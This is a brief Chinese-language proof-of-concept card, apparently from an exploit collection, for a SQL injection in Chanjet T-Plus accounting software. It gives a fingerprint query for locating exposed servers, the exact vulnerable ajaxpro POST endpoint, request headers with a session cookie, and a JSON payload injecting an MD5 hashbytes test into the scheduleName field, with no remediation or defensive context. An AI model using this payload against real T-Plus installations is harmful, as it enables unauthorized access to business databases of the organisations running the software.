# 畅捷通T-PlusajaxproUfidaSQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="畅捷通-TPlus"`
- **请求**：`POST /tplus/ajaxpro/Ufida.T.SM.UIP.ScheduleManage.ScheduleManageController,Ufida.T.SM.UIP.ashx?method=GetScheduleLogList HTTP/1.1`
- **关键头**：`Content-Length: 93`　`Content-Type: application/json`　`Cookie: ASP.NET_SessionId=tuydvcbd5sksmiqt33ywg4gx`

**请求体 / payload**
```
{"scheduleName":"' AND 1 IN (SELECT sys.fn_varbintohexstr(hashbytes('MD5','1'))) AND '1'='1"}
```
- **预期**：200　|　—